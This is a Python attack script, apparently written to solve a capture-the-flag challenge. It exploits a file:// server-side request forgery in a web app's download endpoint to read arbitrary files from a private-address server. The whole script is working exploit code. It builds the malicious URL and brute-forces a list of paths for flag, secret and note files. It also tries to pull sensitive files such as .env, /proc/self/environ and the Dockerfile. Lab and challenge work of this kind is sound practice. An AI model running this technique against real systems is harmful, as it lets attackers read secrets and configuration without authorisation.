"""Find text files in the server's web directory via file:// SSRF."""
import requests

T = "http://10.82.168.213"

def read_file(path):
    """Read a file from the server via file:// SSRF."""
    url = f"{T}/download?server=file://{path}?&id=1"
    r = requests.get(url, timeout=8)
    if r.status_code == 200 and len(r.content) > 0:
        return r.content
    return None

# Known structure from source code:
# /usr/src/app/app.py
# /usr/src/app/public-docs/
# /usr/src/app/private-docs/
# /usr/src/app/static/
# /usr/src/app/templates/

# Common text file names to look for
text_files = [
    # Root app dir
    "/usr/src/app/flag.txt",
    "/usr/src/app/secret.txt",
    "/usr/src/app/note.txt",
    "/usr/src/app/readme.txt",
    "/usr/src/app/README.txt",
    "/usr/src/app/config.txt",
    "/usr/src/app/.env",
    # Static dir
    "/usr/src/app/static/flag.txt",
    "/usr/src/app/static/secret.txt",
    "/usr/src/app/static/note.txt",
    # Public docs
    "/usr/src/app/public-docs/flag.txt",
    "/usr/src/app/public-docs/secret.txt",
    "/usr/src/app/public-docs/note.txt",
    # Private docs
    "/usr/src/app/private-docs/flag.txt",
    "/usr/src/app/private-docs/secret.txt",
    "/usr/src/app/private-docs/note.txt",
    # Templates
    "/usr/src/app/templates/flag.txt",
    # Common web dirs
    "/var/www/html/flag.txt",
    "/var/www/flag.txt",
    # Also try without extension
    "/usr/src/app/flag",
    "/usr/src/app/public-docs-k057230990384293/flag.txt",
    "/usr/src/app/public-docs-k057230990384293/secret.txt",
    "/usr/src/app/public-docs-k057230990384293/note.txt",
    # Static subdirs
    "/usr/src/app/static/imgs/flag.txt",
    "/usr/src/app/static/css/flag.txt",
    "/usr/src/app/static/js/flag.txt",
]

print("[*] Searching for text files via file:// SSRF...\n")
for path in text_files:
    try:
        data = read_file(path)
        if data and len(data) > 0:
            text = data.decode(errors="replace")
            # Skip PDF files and error pages
            if not text.startswith("%PDF") and "Werkzeug" not in text:
                print(f"  [FOUND] {path} ({len(data)} bytes)")
                print(f"  Content: {text[:500]}")
                print()
    except Exception as e:
        pass

# Also try to list directory contents by reading /proc or common listing tricks
print("\n[*] Trying to discover more files...")
# Read Dockerfile or docker-compose for hints
extra = [
    "/usr/src/app/Dockerfile",
    "/usr/src/app/docker-compose.yml",
    "/usr/src/app/requirements.txt",
    "/proc/self/cmdline",
    "/proc/self/environ",
]
for path in extra:
    try:
        data = read_file(path)
        if data and len(data) > 0:
            text = data.decode(errors="replace")
            if "Werkzeug" not in text:
                print(f"  [FOUND] {path} ({len(data)} bytes)")
                print(f"  Content: {text[:500]}")
                print()
    except:
        pass
